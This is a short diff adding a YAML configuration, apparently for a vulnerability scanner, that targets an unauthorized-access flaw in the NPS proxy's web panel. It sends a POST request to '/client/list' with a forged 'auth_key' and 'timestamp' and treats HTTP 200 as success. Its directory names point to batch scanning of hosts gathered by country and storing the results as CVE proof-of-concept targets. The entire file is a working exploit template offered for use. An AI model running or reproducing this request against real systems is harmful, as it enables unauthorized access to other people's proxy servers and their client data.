@@ -1,0 +1,16 @@
+targetPath: /client/list
+targetMethod: post
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:8080
+    https: 127.0.0.1:8080
+targetAllowRedirects: false
+targetHeaders:
+    Content-Type: application/x-www-form-urlencoded
+targetJson:
+targetData: search=&order=asc&offset=0&limit=10&auth_key=8c98b1bdedbc569c4e61eeaeb11ce772&timestamp=1659838908
+targetReExpression:
+    respStatusCode: 200
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/NPS未授权访问/
+targetRestText: True
